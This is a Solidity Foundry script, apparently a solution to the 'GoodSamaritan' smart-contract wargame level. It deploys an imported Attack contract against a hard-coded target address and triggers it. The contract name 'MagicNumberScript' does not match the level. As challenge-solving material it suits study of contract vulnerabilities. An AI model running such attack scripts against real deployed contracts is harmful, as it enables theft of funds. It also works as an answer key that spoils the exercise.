// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import {Script, console} from "forge-std/Script.sol";
import {GoodSamaritan, Attack} from "../src/GoodSamaritan.sol";

contract MagicNumberScript is Script {
    address constant DEPLOYED_CONTRACT_ADDRESS = 0x89363284B7C9C0aC2408628dbD422362F5Ab2ac5;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        GoodSamaritan target = GoodSamaritan(payable(0x89363284B7C9C0aC2408628dbD422362F5Ab2ac5));

        Attack attacker = new Attack(target);

        attacker.attack();

        vm.stopBroadcast();
    }
}